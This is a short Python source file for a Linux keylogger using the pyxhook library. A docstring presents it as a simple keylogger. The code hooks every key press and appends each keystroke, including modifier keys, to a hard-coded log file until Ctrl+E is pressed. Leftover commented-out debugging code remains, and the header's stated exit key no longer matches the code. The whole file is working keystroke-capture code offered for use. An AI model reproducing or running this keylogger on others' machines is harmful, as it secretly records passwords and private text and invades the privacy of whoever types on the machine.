"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
#change this to your log file's path
log_file='/home/bertrand/Desktop/file.log'

ctrl_check = False

#this function is called everytime a key is pressed.
def OnKeyboardEvent(event):
  #fob=open(log_file,'a')
  #fob.write(event.Key)
  #fob.write('\n')

  #if event.Ascii==96: #96 is the ascii value of the grave key (`)
  #  fob.close()
  #  new_hook.cancel()
  global ctrl_check
  f = open(log_file, "a+")
  buffer = ""
  #TODO: Change event.Ascii for event.Key for the checks
  # if event.Ascii == 5: #5 is the event for Ctrl+E
  #   f.close()
  #   new_hook.cancel()
  #   exit(1)
  # # Preventing null and backspace
  # if event.Ascii != 0 or 8:
  #   #buffer = f.read()
  #   keylogs = chr(event.Ascii)
  #   print("Event : " + str(event))
  #   print("ASCII : " + str(event.Ascii))
  #   print("keylogs : " + keylogs)
  #   print("key : " + event.Key)
  #   if event.Key == "Return":
  #     keylogs = "\n"
  #   buffer += keylogs
  #   print("buffer : " + buffer)
  #   f.write(buffer)
  keylog = event.Key
  if not event.Ascii:
    if "Alt" in event.Key:
      keylog = keylog + "+"
    elif "Control" in event.Key:
      ctrl_check = not(ctrl_check)
      keylog = keylog + "+"
    elif "Shift" in event.Key:
      keylog = keylog + "+"
    elif event.Key == "BackSpace":
      keylog = keylog + "\n"


  if event.Key == "Return":
    keylog = "\n"

  if event.Key == "space":
    print("Space")
    keylog = " "
    print("Keylog : " + keylog)

  buffer += keylog
  f.write(buffer)
  if ctrl_check:
    if not "Control" in event.Key:
      ctrl_check = not (ctrl_check)
      f.write(" ")
    if event.Key == "e":
      f.write("\n")
      f.close()
      new_hook.cancel()
      exit(1)


#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyboardEvent
#hook the keyboardb
new_hook.HookKeyboard()
#start the session
new_hook.start()
